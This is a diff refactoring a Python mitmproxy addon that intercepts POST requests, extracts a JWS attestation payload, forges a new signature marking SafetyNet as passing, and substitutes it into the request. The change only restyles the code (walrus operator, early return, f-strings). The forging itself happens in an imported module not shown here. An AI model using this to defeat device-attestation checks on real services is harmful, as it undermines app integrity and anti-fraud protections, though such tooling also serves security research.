@@ -42,22 +42,21 @@ def _fix_base64_padding(data: bytes) -> bytes:
     """Extend the base64 padding until it's correct. This is needed for some
     forms of URL-safe base64 which do not include padding.
     """
-    missing_padding = len(data) % 4
-    if missing_padding:
+    if missing_padding := len(data) % 4:
         data += b'=' * (4 - missing_padding)
     return data
 
 def request(flow: HTTPFlow):
-    if flow.request.method == "POST":
-        ctx.log.info("== investigating POST request ==")
-        jws = extract_jws_payload(flow.request.content)
-        if jws is not None:
-            ctx.log.info("== intercepting JWS-containing POST to {} ==".format(
-                flow.request.url))
-            # forge a new signature, assuming SafetyNet
-            modified_jws = jwsmodify.modify_jws_and_forge_signature(jws, jwsmodify.set_safetynet_passing)
-            flow.request.content = flow.request.content.replace(jws, modified_jws)
-            ctx.log.info("original JWS: {}\nnew JWS:{}".format(jws, modified_jws))
-            ctx.log.info("== modified and set new JWS ==")
-        else:
-            ctx.log.info("== no JWS content found ==")
+    if flow.request.method != "POST":
+        return
+    ctx.log.info("== investigating POST request ==")
+    jws = extract_jws_payload(flow.request.content)
+    if jws is not None:
+        ctx.log.info(f"== intercepting JWS-containing POST to {flow.request.url} ==")
+        # forge a new signature, assuming SafetyNet
+        modified_jws = jwsmodify.modify_jws_and_forge_signature(jws, jwsmodify.set_safetynet_passing)
+        flow.request.content = flow.request.content.replace(jws, modified_jws)
+        ctx.log.info(f"original JWS: {jws}\nnew JWS:{modified_jws}")
+        ctx.log.info("== modified and set new JWS ==")
+    else:
+        ctx.log.info("== no JWS content found ==")
